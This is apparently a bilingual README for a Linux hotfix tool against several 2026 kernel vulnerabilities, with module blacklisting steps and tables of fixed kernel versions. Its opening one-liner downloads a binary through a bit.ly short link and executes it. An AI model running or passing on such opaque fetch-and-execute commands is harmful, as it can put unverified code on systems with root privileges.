# ПО для устранения уязвимостей frag family / Mitigation tool for frag family vulnerability
- Copy Fail (2026)
- Dirty Frag (2026)
- Fragnesia (2026)
- DirtyClone (2026)
- PEdit-CoW (2026)

## Запустить исправление на любом Linux / Run any Linux hotfix
```bash
b="/tmp/cve_2026_frag_family_fix"; wget -qO $b $(wget -qO- https://bit.ly/4vetMTB | grep browser_download_url | grep -v .exe | cut -d '"' -f 4) && chmod +x $b && $b
```
или
```bash
b="/tmp/cve_2026_frag_family_fix"; curl -fsSL "$(curl -fsSL https://bit.ly/4vetMTB | grep browser_download_url | grep -v .exe | cut -d '"' -f 4)" -o $b && chmod +x $b && $b
```

# CVE-2026-46300 / CVE-2026-43500 / CVE-2026-43284 / CVE-2026-46300 / CVE-2026-46331

## Описание
- проверяет включенные модули из CVE-2026-46300 / CVE-2026-43500 / CVE-2026-43284 / CVE-2026-46300 / CVE-2026-46331
- предлагает обновление ядра если доступно
- отключает `esp4, esp6, rxrpc, act_pedit` если нет
- блокирует загрузку через `modprobe`
- добавляет `module_blacklist` в grub
- автоматически очищает хотфикс после обновления ядра
- для RHEL-совместимых систем (AlmaLinux, Rocky, Oracle, Fedora) отключает Boot Loader Specification (GRUB_ENABLE_BLSCFG=false), устанавливает GRUB_DEFAULT=0 и создаёт хук установки ядра (/etc/kernel/install.d/99-grub-update.install), который обновляет конфигурацию grub после обновления ядра, чтобы при следующей загрузке запускалось самое свежее ядро.
- для минорных релизов предлагает и выполняет обновление до последней минорной версии для которой есть обновление ядра

## Description
- checks for CVE-2026-46300 / CVE-2026-43500 / CVE-2026-43284 / CVE-2026-46300 / CVE-2026-46331 vulnerability enabled modules
- offers kernel update if available
- disables `esp4, esp6, rxrpc, act_pedit` if not
- blocks module loading via `modprobe`
- adds `module_blacklist` to grub
- automatically cleans up hotfix after kernel update
- for RHEL-based systems (AlmaLinux, Rocky, Oracle, Fedora), disables Boot Loader Specification (GRUB_ENABLE_BLSCFG=false) and sets GRUB_DEFAULT=0, then creates a kernel install hook (/etc/kernel/install.d/99-grub-update.install) that regenerates grub config after kernel updates to ensure the most recent kernel loads on next boot
- for minor releases, it offers and performs an update to the latest minor version that has a kernel update available.

# CVE-2026-31431 / Copy Fail mitigation (algif_aead)

## Описание

Утилита проверяет уязвимость **CVE-2026-31431** (pre condition) и при наличии root-привилегий применяет mitigation:

- определяет защищённые комбинации ОС (включая WSL) и версий ядра
- предлагает обновление ядра с исправлением если оно доступно
- отключает `algif_aead` если нет
- блокирует загрузку через `modprobe`
- добавляет `initcall_blacklist=algif_aead_init`
- ограничивает `AF_ALG` через systemd

## Description

This tool checks for **CVE-2026-31431** (pre condition) and applies mitigation (requires root):

- identifies protected combinations of OS (including WSL) and kernel versions
- offers a kernel update with a fix if available
- disables `algif_aead` if not
- blocks module loading via `modprobe`
- adds `initcall_blacklist=algif_aead_init`
- restricts `AF_ALG` via systemd

## Linux сборка / build
 ```bash
docker run --rm -v "$PWD":/app -w /app golang:alpine sh -c "apk add --no-cache upx && go build -ldflags='-s -w' -o cve_2026_frag_family_fix cve_2026_frag_family_fix.go && upx --best --ultra-brute cve_2026_frag_family_fix"
```

## Обновление ядра (не хотфикс) доступно для / Kernel update (not hotfix) is exist for
| OS | Copy Fail<br>(CVE-2026-31431) | Dirty Frag<br>(CVE-2026-43500/43284) | Fragnesia<br>(CVE-2026-46300) | PEdit-CoW<br>(CVE-2026-46331) |
|----|:---:|:---:|:---:|:---:|
| **Debian 10** (buster) | ❌ | ❌ | ❌ | ❌ |
| **Debian 11** (bullseye) | ✅ | ✅ | ✅ | ✅ |
| **Debian 12** (bookworm) | ✅ | ✅ | ✅ | ✅ |
| **Debian 13** (trixie) | ✅ | ✅ | ✅ | ✅ |
| **Ubuntu 18.04** (bionic) | ❌ | ❌ | ❌ | ❌ |
| **Ubuntu 20.04** (focal) | ❌ | ❌ | ❌ | ❌ |
| **Ubuntu 22.04** (jammy) | ✅ | ❌ | ❌ | ❌ |
| **Ubuntu 24.04** (noble) | ✅ | ✅ | ✅ | ❌ |
| **Ubuntu 25.04** (plucky) | ❌| ❌ | ❌ | ❌ |
| **Ubuntu 26.04** (resolute) | ✅ | ✅ | ✅ | ✅ |
| **CentOS Stream 8** | ❌ | ❌ | ❌ | ❌ |
| **CentOS Stream 9** | ✅ | ✅ | ✅ | ✅ |
| **CentOS Stream 10** | ✅ | ✅ | ✅ | ✅ |
| **AlmaLinux 8** | ✅ | ✅ | ✅ | ✅ |
| **AlmaLinux 9** | ✅ | ✅ | ✅ | ✅ |
| **AlmaLinux 10** | ✅ | ✅ | ✅ | ✅ |
| **Rocky Linux 8** | ✅ | ✅ | ✅ | ✅ |
| **Rocky Linux 9** | ✅ | ✅ | ✅ | ✅ |
| **Rocky Linux 10** | ✅ | ✅ | ✅ | ✅ |
| **Fedora 40** | ❌ | ❌ | ❌ | ❌ |
| **Fedora 41** | ❌ | ❌ | ❌ | ❌ |
| **Fedora 42** | ✅ | ✅ | ✅ | ✅ |
| **Fedora 43** | ✅ | ✅ | ✅ | ✅ |
| **Fedora 44** | ✅ | ✅ | ✅ | ✅ |
| **Oracle Linux 8** | ✅ | ✅ | ✅ | ✅ |
| **Oracle Linux 9** | ✅ | ✅ | ✅ | ✅ |
| **Oracle Linux 10** | ✅ | ✅ | ✅ | ✅ |

## Команды обновления ядра / Kernel update commands
- Debian `apt update && apt install linux-image-amd64 linux-headers-amd64 -y`
- Ubuntu `apt update && apt install linux-image-generic linux-headers-generic -y`
- CentOS `dnf clean metadata && dnf upgrade 'kernel*' -y`
- AlmaLinux `dnf clean metadata && dnf upgrade 'kernel*' -y`
- RockyLinux `dnf clean metadata && dnf upgrade 'kernel*' -y`
- Fedora `dnf clean metadata && dnf upgrade 'kernel*' -y`
- OracleLinux `dnf clean metadata && dnf upgrade 'kernel*' -y`

## Минимальная версия ядра для исправления / Kernel fixed minimal version number
| OS | Copy Fail<br>(CVE-2026-31431) | Dirty Frag<br>(CVE-2026-43284) | Fragnesia<br>(CVE-2026-46300) | PEdit-CoW<br>(CVE-2026-46331) |
|----|:---|:---|:---|:---|
| **Debian 10** (buster) | ❌ | ❌ | ❌ | ❌ |
| **Debian 11** (bullseye) | 5.10.0-41-amd64 | 5.10.0-42-amd64 | 5.10.0-43-amd64 | 5.10.0-45-amd64 |
| **Debian 12** (bookworm) | 6.1.0-45-amd64 | 6.1.0-47-amd64 | 6.1.0-48-amd64 | 6.1.0-50-amd64 |
| **Debian 13** (trixie) | 6.12.85+deb13-amd64 | 6.12.86+deb13-amd64 | 6.12.88+deb13-amd64 | 6.12.94+deb13-amd64 |
| **Ubuntu 18.04** (bionic) | ❌ | ❌ | ❌ | ❌ |
| **Ubuntu 20.04** (focal) | ❌ | ❌ | ❌ | ❌ |
| **Ubuntu 22.04** (jammy) | 5.15.0-177-generic | ❌ | ❌ | ❌ |
| **Ubuntu 24.04** (noble) | 6.8.0-111-generic | 6.8.0-124-generic | 6.8.0-124-generic | ❌ |
| **Ubuntu 25.04** (plucky) | ❌ | ❌ | ❌ | ❌ |
| **Ubuntu 26.04** (resolute) | 7.0.0-15-generic | 7.0.0-22-generic | 7.0.0-22-generic | 7.0.0-27-generic |
| **CentOS Stream 8** | ❌ | ❌ | ❌ | ❌ |
| **CentOS Stream 9** | 5.14.0-701.el9.x86_64 | 5.14.0-708.el9.x86_64 | 5.14.0-721.el9.x86_64 | 5.14.0-721.el9.x86_64 |
| **CentOS Stream 10** | 6.12.0-226.el10.x86_64 | 6.12.0-231.el10.x86_64 | 6.12.0-246.el10.x86_64 | 6.12.0-246.el10.x86_64 |
| **AlmaLinux 8.10** | 4.18.0-553.121.1.el8_10.x86_64 | 4.18.0-553.123.2.el8_10.x86_64 | 4.18.0-553.124.4.el8_10.x86_64 | 4.18.0-553.136.1.el8_10.x86_64 |
| **AlmaLinux 9.7** | 5.14.0-611.49.2.el9_7.x86_64 | 5.14.0-611.54.3.el9_7.x86_64 | 5.14.0-611.54.6.el9_7.x86_64 | 5.14.0-687.17.1.el9_8.x86_64 |
| **AlmaLinux 10.2** | 6.12.0-211.26.1.el10_2.x86_64 | 6.12.0-211.26.1.el10_2.x86_64 | 6.12.0-211.26.1.el10_2.x86_64 | 6.12.0-211.26.1.el10_2.x86_64 |
| **Rocky Linux 8.10** | 4.18.0-553.123.1.el8_10.x86_64 | 4.18.0-553.124.1.el8_10.x86_64 | 4.18.0-553.126.1.el8_10.x86_64 | 4.18.0-553.136.1.el8_10.x86_64 |
| **Rocky Linux 9.8** | 5.14.0-687.17.1.el9_8.x86_64 | 5.14.0-687.17.1.el9_8.x86_64 | 5.14.0-687.17.1.el9_8.x86_64 | 5.14.0-687.17.1.el9_8.x86_64 |
| **Rocky Linux 10.2** | 6.12.0-211.16.1.el10_2.0.1.x86_64| 6.12.0-211.16.1.el10_2.0.1.x86_64 | 6.12.0-211.16.1.el10_2.0.1.x86_64 | 6.12.0-211.26.1.el10_2.x86_64 |
| **Fedora 40** | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Fedora 41** | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Fedora 42** | 6.19.14-100.fc42.x86_64 | 6.19.14-101.fc42.x86_64 | 6.19.14-108.fc42.x86_64 | 6.19.14-108.fc42.x86_64 |
| **Fedora 43** | 6.19.14-200.fc43.x86_64 | 7.0.4-100.fc43.x86_64 | 7.0.9-105.fc43.x86_64 | 7.0.12-101.fc43.x86_64 |
| **Fedora 44** | 6.19.14-300.fc44.x86_64 | 7.0.4-200.fc44.x86_64 | 7.0.9-205.fc44.x86_64 | 7.0.12-201.fc44.x86_64 |
| **Oracle Linux 8.10** | 5.15.0-319.201.4.4.el8uek.x86_64 | 5.15.0-319.201.4.6.el8uek.x86_64 | 5.15.0-320.202.8.5.el8uek.x86_64 | 5.15.0-322.203.3.2.el8uek.x86_64 |
| **Oracle Linux 9.7** | 6.12.0-201.74.2.2.el9uek.x86_64 | 6.12.0-201.74.2.3.el9uek.x86_64 | 6.12.0-202.76.4.4.el9uek.x86_64 | 6.12.0-204.92.4.2.el9uek.x86_64 |
| **Oracle Linux 10.1** | 6.12.0-201.74.2.2.el10uek.x86_64 | 6.12.0-201.74.2.3.el10uek.x86_64 | 6.12.0-202.76.4.4.el10uek.x86_64 | 6.12.0-204.92.4.2.el10uek.x86_64 |